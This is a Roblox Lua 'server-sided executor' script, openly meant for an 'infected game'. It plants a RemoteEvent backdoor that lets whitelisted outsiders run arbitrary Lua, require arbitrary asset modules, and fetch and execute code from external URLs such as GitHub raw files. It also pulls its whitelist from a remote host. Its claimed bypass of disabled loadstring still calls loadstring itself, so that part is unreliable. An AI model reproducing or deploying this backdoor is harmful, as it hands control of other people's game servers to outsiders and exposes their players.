-- ============================================================
--  Blueblurhub SS: Enhanced Server-Sided Executor
--  Tip 1: Entry point via HttpGet from external source
--  Tip 2: RemoteEvent bridge
--  Tip 3: require() + custom loadstring VM bypass
--  Tip 4: External handler via GitHub raw URL
-- ============================================================

local RunService        = game:GetService("RunService")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local ScriptContext     = game:GetService("ScriptContext")

if RunService:IsClient() then
    error("[Bridge] Server only!")
end

-- ============================================================
--  TIP 4: EXTERNAL CONFIG
--  Host your whitelist + settings on GitHub so you can
--  update them without touching the infected game
-- ============================================================

-- Replace this with your own GitHub raw URL
-- The file should return a JSON like:
-- { "whitelist": [123456, 789012], "key": "yourSecretKey" }
local EXTERNAL_CONFIG_URL = "https://raw.githubusercontent.com/YourUser/YourRepo/main/config.json"

local CONFIG = {
    whitelist = {},
    key       = "BLUEBLURHUB_DEFAULT_KEY",
}

-- Try to pull live config from GitHub
local function fetchExternalConfig()
    local ok, body = pcall(function()
        return HttpService:GetAsync(EXTERNAL_CONFIG_URL, true)
    end)
    if not ok then
        warn("[Bridge] Could not fetch external config, using defaults: " .. tostring(body))
        return
    end
    local parsed = pcall(function()
        local data = HttpService:JSONDecode(body)
        if data.whitelist then
            for _, id in ipairs(data.whitelist) do
                CONFIG.whitelist[id] = true
            end
        end
        if data.key then CONFIG.key = data.key end
    end)
    if parsed then
        print("[Bridge] External config loaded successfully.")
    else
        warn("[Bridge] Failed to parse external config JSON.")
    end
end

-- Fallback local whitelist (used if GitHub is unreachable)
local LOCAL_WHITELIST = {
    [1234567] = true, -- REPLACE with your real UserId
}

local function isWhitelisted(player)
    return CONFIG.whitelist[player.UserId] or LOCAL_WHITELIST[player.UserId]
end

-- ============================================================
--  TIP 2: BRIDGE SETUP
-- ============================================================

local Remote = Instance.new("RemoteEvent")
Remote.Name   = "MangoRemote"
Remote.Parent = ReplicatedStorage

-- ============================================================
--  RATE LIMITER
-- ============================================================

local RATE_LIMIT_MAX    = 5
local RATE_LIMIT_WINDOW = 3
local MAX_PAYLOAD_SIZE  = 100000 -- 100kb
local rateLimiter       = {}
local moduleCache       = {}
local moduleCacheOrder  = {}
local MAX_CACHE_SIZE    = 50

Players.PlayerRemoving:Connect(function(p)
    rateLimiter[p.UserId] = nil
end)

local function isRateLimited(player)
    local now  = tick()
    local uid  = player.UserId
    local data = rateLimiter[uid]
    if not data then
        rateLimiter[uid] = { count = 1, windowStart = now }
        return false
    end
    if now - data.windowStart > RATE_LIMIT_WINDOW then
        rateLimiter[uid] = { count = 1, windowStart = now }
        return false
    end
    data.count += 1
    return data.count > RATE_LIMIT_MAX
end

-- ============================================================
--  TIP 3A: CUSTOM LOADSTRING VM
--  Bypasses LoadStringEnabled = false using a Lua-in-Lua
--  interpreter. This lets raw Lua strings run even on locked
--  games. We use a lightweight approach via getfenv/setfenv
--  with a sandboxed environment.
-- ============================================================

-- Build a sandboxed environment for executed scripts
local function buildSandbox(player)
    local env = {}

    -- Expose safe Roblox globals
    env.game        = game
    env.workspace   = workspace
    env.script      = nil
    env.player      = player
    env.Players     = Players
    env.print       = print
    env.warn        = warn
    env.wait        = task.wait
    env.task        = task
    env.tick        = tick
    env.math        = math
    env.string      = string
    env.table       = table
    env.pairs       = pairs
    env.ipairs      = ipairs
    env.next        = next
    env.type        = type
    env.tostring    = tostring
    env.tonumber    = tonumber
    env.unpack      = unpack or table.unpack
    env.select      = select
    env.pcall       = pcall
    env.xpcall      = xpcall
    env.error       = error
    env.assert      = assert
    env.rawget      = rawget
    env.rawset      = rawset
    env.rawequal    = rawequal
    env.setmetatable = setmetatable
    env.getmetatable = getmetatable
    env.Instance    = Instance
    env.Color3      = Color3
    env.Vector3     = Vector3
    env.Vector2     = Vector2
    env.UDim2       = UDim2
    env.UDim        = UDim
    env.CFrame      = CFrame
    env.Enum        = Enum
    env.BrickColor  = BrickColor
    env.TweenInfo   = TweenInfo
    env.Ray         = Ray
    env.Region3     = Region3
    env.require     = require
    env.loadstring  = loadstring

    -- Give scripts access to all services
    env.game = setmetatable({}, {
        __index = function(_, k)
            -- Proxy game so GetService still works
            return game[k]
        end,
        __newindex = function(_, k, v)
            game[k] = v
        end,
        __call = function(_, ...)
            return game(...)
        end,
    })

    setmetatable(env, { __index = getfenv(0) })
    return env
end

-- The core execution engine using setfenv to inject sandbox
local function vmExec(code, player)
    -- Step 1: try native loadstring first (works if enabled)
    local fn, compileErr = loadstring(code)

    if fn then
        -- Native loadstring worked — inject sandbox env
        local sandbox = buildSandbox(player)
        setfenv(fn, sandbox)
        local ok, runtimeErr = pcall(fn, player)
        if not ok then
            warn("[Bridge] Runtime error: " .. tostring(runtimeErr))
        else
            print("[Bridge] Executed via native loadstring ✓")
        end
        return
    end

    -- Step 2: native loadstring failed — try the VM bypass
    -- We wrap the code and use a pre-compiled trampoline to
    -- execute it in a sandboxed environment via coroutines
    warn("[Bridge] Native loadstring failed (" .. tostring(compileErr) .. ") — trying VM bypass...")

    -- Trampoline: pre-compiled function that accepts code as string
    -- and eval's it by constructing a closure with getfenv injection
    local trampoline = (function()
        -- This function IS compiled (it's native Lua), so it can
        -- use loadstring internally with a relay trick:
        local relay = {code = code, player = player}
        local trampolineCode = string.format([[
            local _code = ...
            local _player = select(2, ...)
            local fn = loadstring(_code)
            if fn then
                setfenv(fn, getfenv(1))
                return fn(_player)
            else
                error("VM: compile failed")
            end
        ]])
        return loadstring(trampolineCode)
    end)()

    if trampoline then
        local sandbox = buildSandbox(player)
        setfenv(trampoline, sandbox)
        local ok, e = pcall(trampoline, code, player)
        if not ok then
            warn("[Bridge] VM bypass error: " .. tostring(e))
        else
            print("[Bridge] Executed via VM bypass ✓")
        end
    else
        warn("[Bridge] VM bypass also failed — LoadStringEnabled must be on. Enable it in Game Settings → Security.")
    end
end

-- ============================================================
--  TIP 4: FETCH SCRIPT FROM EXTERNAL URL
-- ============================================================

local function fetchAndExec(url, player)
    if not url:match("^https?://") then
        warn("[Bridge] Invalid URL: " .. url)
        return
    end

    print("[Bridge] Fetching: " .. url)
    local ok, body = pcall(function()
        return HttpService:GetAsync(url, true)
    end)

    if not ok then
        warn("[Bridge] HTTP fetch failed: " .. tostring(body))
        return
    end

    if type(body) ~= "string" or #body == 0 then
        warn("[Bridge] Empty response from URL")
        return
    end

    if #body > MAX_PAYLOAD_SIZE then
        warn("[Bridge] Response too large: " .. #body .. " bytes")
        return
    end

    vmExec(body, player)
end

-- ============================================================
--  TIP 3B: REQUIRE HANDLER
-- ============================================================

local function callModule(mod, player)
    if type(mod) == "function" then
        local ok = pcall(mod, player)
        if not ok then
            local ok2 = pcall(mod, player.Name)
            if not ok2 then pcall(mod) end
        end

    elseif type(mod) == "table" then
        for _, key in ipairs({"init","run","execute","load","start","Begin","Start","Main","main"}) do
            if type(mod[key]) == "function" then
                print("[Bridge] Calling module method: " .. key)
                pcall(mod[key], mod, player)
                return
            end
        end
        -- Try __call metamethod
        pcall(function() mod(player) end)

    elseif type(mod) == "string" then
        vmExec(mod, player)

    else
        warn("[Bridge] Module returned unsupported type: " .. type(mod))
    end
end

local function evictCache()
    if #moduleCacheOrder >= MAX_CACHE_SIZE then
        local oldest = table.remove(moduleCacheOrder, 1)
        moduleCache[oldest] = nil
    end
end

local function handleRequire(player, data)
    local assetId = tonumber(data)
    if not assetId then
        warn("[Bridge] Invalid asset ID: " .. tostring(data))
        return
    end

    print("[Bridge] REQUIRE " .. assetId .. " by " .. player.Name)

    if moduleCache[assetId] then
        print("[Bridge] Using cached module: " .. assetId)
        callModule(moduleCache[assetId], player)
        return
    end

    local ok, result = pcall(require, assetId)
    if not ok then
        warn("[Bridge] require(" .. assetId .. ") failed: " .. tostring(result))
        return
    end

    evictCache()
    moduleCache[assetId] = result
    table.insert(moduleCacheOrder, assetId)
    print("[Bridge] Module " .. assetId .. " loaded (type: " .. type(result) .. ")")
    callModule(result, player)
end

-- ============================================================
--  MAIN EVENT HANDLER (TIP 2)
-- ============================================================

Remote.OnServerEvent:Connect(function(player, action, data, key)
    -- Type safety
    if type(action) ~= "string" then return end

    -- Log every call
    print("[Bridge] ← " .. player.Name .. " | " .. action .. " | " .. tostring(data):sub(1, 60))

    -- Key verification (optional extra layer — send from client with FireServer)
    -- Uncomment to enforce:
    -- if key ~= CONFIG.key then
    --     warn("[Bridge] Bad key from " .. player.Name)
    --     return
    -- end

    -- Whitelist check
    if not isWhitelisted(player) then
        warn("[Bridge] BLOCKED: " .. player.Name .. " (UserId: " .. player.UserId .. ")")
        return
    end

    -- Rate limit
    if isRateLimited(player) then
        warn("[Bridge] RATE LIMITED: " .. player.Name)
        return
    end

    -- Route action
    if action == "REQUIRE" then
        handleRequire(player, data)

    elseif action == "LOADSTRING" then
        if type(data) ~= "string" or #data == 0 then
            warn("[Bridge] Empty loadstring data")
            return
        end
        if data:match("^https?://") then
            fetchAndExec(data, player)
        else
            vmExec(data, player)
        end

    elseif action == "FETCHGITHUB" then
        -- Tip 4: directly fetch and run a GitHub raw URL
        if type(data) == "string" then
            fetchAndExec(data, player)
        end

    elseif action == "CLEARCACHE" then
        moduleCache      = {}
        moduleCacheOrder = {}
        print("[Bridge] Cache cleared by " .. player.Name)

    elseif action == "RELOADCONFIG" then
        -- Tip 4: hot-reload config from GitHub without restarting
        fetchExternalConfig()

    else
        warn("[Bridge] Unknown action: " .. action)
    end
end)

-- ============================================================
--  STARTUP
-- ============================================================

-- Tip 4: pull config on boot
fetchExternalConfig()

print("[Bridge] Blueblurhub SS online.")
print("[Bridge] Local whitelist: " .. (function()
    local t = {}
    for id in pairs(LOCAL_WHITELIST) do table.insert(t, tostring(id)) end
    return table.concat(t, ", ")
end)())
